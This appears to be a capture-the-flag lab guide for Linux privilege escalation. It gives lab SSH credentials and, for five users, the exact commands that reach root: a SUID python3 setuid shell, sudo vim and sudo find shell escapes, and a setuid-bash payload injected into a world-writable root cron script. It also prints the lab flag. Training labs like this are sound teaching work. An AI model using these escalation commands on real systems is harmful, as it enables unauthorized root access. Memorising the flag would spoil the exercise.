How does this lab work?

Connect via SSH using any of the 5 system users. Each one has a different privilege escalation vector. The goal is to gain root access and read /root/root.txt.

The admin user has full sudo — use it to inspect the machine: SUID binaries, sudoers entries, cron jobs...

SSH Connection
# Connect via SSH — replace {{ target_ip }} with the lab IP
ssh admin@{{ target_ip }} # password: password1 (full sudo)
ssh alice@{{ target_ip }} # password: Password1
ssh bob@{{ target_ip }} # password: welcome1
ssh charlie@{{ target_ip }} # password: changeme
ssh dave@{{ target_ip }} # password: P@ssw0rd

Guía completa — Escalada de Privilegios por SSH

Conéctate con cada usuario y sigue su vector específico. El objetivo es leer /root/root.txt.

🔑 admin — sudo completo

ssh admin@TARGET_IP   # password: password1
sudo su
cat /root/root.txt
# 🚩 HL{r00t_pr1v3sc_succ3ss}

# Reconocimiento de la máquina:
sudo cat /etc/sudoers.d/*
find / -perm -4000 -type f 2>/dev/null
cat /etc/cron.d/*
ls -la /opt/scripts/

🐍 alice — SUID python3

ssh alice@TARGET_IP   # password: Password1

# Descubrir binario SUID
find / -perm -4000 -type f 2>/dev/null
# → /usr/bin/python3

# Escalar
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id      # uid=0(root)
cat /root/root.txt
# 🚩 HL{r00t_pr1v3sc_succ3ss}

📝 bob — sudo vim (GTFOBins)

ssh bob@TARGET_IP   # password: welcome1

# Ver privilegios sudo
sudo -l
# → (ALL) NOPASSWD: /usr/bin/vim

# Escalar
sudo vim -c ':!/bin/bash'
id      # uid=0(root)
cat /root/root.txt
# 🚩 HL{r00t_pr1v3sc_succ3ss}

⏱ charlie — Cron job world-writable

ssh charlie@TARGET_IP   # password: changeme

# Seguir pista
cat ~/note.txt
# → Tip: check what runs automatically on this system...

# Buscar cron
cat /etc/cron.d/*
# → * * * * * root /opt/scripts/cleanup.sh

# Comprobar permisos
ls -la /opt/scripts/cleanup.sh
# → -rwxrwxrwx   (world-writable!)

# Inyectar payload
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh

# Esperar ~1 minuto y escalar
/tmp/rootbash -p
id      # euid=0(root)
cat /root/root.txt
# 🚩 HL{r00t_pr1v3sc_succ3ss}

🔍 dave — sudo find (GTFOBins)

ssh dave@TARGET_IP   # password: P@ssw0rd

# Ver privilegios sudo
sudo -l
# → (ALL) NOPASSWD: /usr/bin/find

# Escalar
sudo find . -exec /bin/bash \; -quit
id      # uid=0(root)
cat /root/root.txt
# 🚩 HL{r00t_pr1v3sc_succ3ss}
